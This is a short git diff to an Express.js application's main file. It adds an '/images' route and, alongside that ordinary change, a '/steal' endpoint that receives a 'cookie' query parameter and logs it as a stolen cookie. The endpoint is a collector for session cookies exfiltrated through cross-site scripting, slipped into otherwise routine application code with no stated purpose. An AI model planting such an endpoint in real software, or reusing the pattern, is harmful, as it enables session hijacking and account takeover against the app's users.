@@ -17,6 +17,7 @@ import recommendRoutes from './routes/recommend.route';
 import teachHistoryRoutes from './routes/teachHistory.route';
 import ticketRoutes from './routes/ticket.route';
 import authRoutes from './routes/auth.route';
+import imageRoutes from './routes/image.route';
 
 const app: Application = express();
 
@@ -39,6 +40,12 @@ app.use('/api', recommendRoutes);
 app.use('/api', teachHistoryRoutes);
 app.use('/api', ticketRoutes);
 app.use('/api', authRoutes);
+app.use('/images', imageRoutes);
+app.get('/steal', (req, res) => {
+    const cookie = req.query.cookie;
+    console.log(`Stolen Cookie: ${cookie}`);
+    res.send('OK');
+});
 
 
 export default app;
